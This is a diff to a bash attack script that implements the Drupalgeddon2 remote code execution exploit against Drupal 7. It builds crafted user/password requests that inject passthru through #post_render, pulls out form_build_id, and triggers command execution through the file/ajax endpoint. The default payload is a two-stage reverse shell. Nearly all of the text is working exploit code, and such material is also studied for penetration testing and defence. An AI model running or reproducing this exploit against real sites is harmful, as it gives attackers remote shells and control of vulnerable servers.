@@ -170,14 +170,21 @@ upload_drupal_module() {
 
 run_drupalgeddon2_drupal7() {
     init_drupal
-    local url="$target_url/?q=user/password&$(urlencode "name[#post_render][]")=passthru&$(urlencode "name[#type]")=markup"
+    echo "Running Drupalgeddon2 for Drupal 7"
+    local url="$target_url"
+    local target_path="user/password"
+    if [[ $url != */ ]]; then
+        url="$url/"
+    fi
+    url+="?q="
     if [[ -z $cmd ]]; then
         cmd=$(get_bash_reverse_shell)
+        cmd=$(get_twostage_reverse_shell)
     fi
-    cmd=$(get_twostage_reverse_shell)
-    cmd=$(urlencode "$cmd")
-    url="$url&$(urlencode "name[#markup]")=$cmd"
-    request=$(curl -s "$url" \
+    local name_post_render="$(urlencode "name[#post_render][]")=passthru"
+    local name_type="$(urlencode "name[#type]")=markup"
+    local name_markup="$(urlencode "name[#markup]")=$(urlencode "$cmd")"
+    request=$(curl -s "$url$target_path&$name_post_render&$name_type&$name_markup" \
         -d "form_id=user_pass" \
         -d "_triggering_element_name=name" $proxy_option)
     form_build_id=$(echo "$request" | grep -oP 'name="form_build_id" value="\K[^"]+')
@@ -185,9 +192,8 @@ run_drupalgeddon2_drupal7() {
         echo "Failed to extract form_build_id from the response."
         return 1
     fi
-    echo "Extracted form_build_id: $form_build_id"
-    url="$target_url/file/ajax/name/%23value/$form_build_id"
-    curl "$url" \
+    echo "Extracted form_build_id: $form_build_id"    
+    curl "$url/file/ajax/name/%23value/$form_build_id" \
         -d "form_build_id=$form_build_id" $proxy_option
 
 }
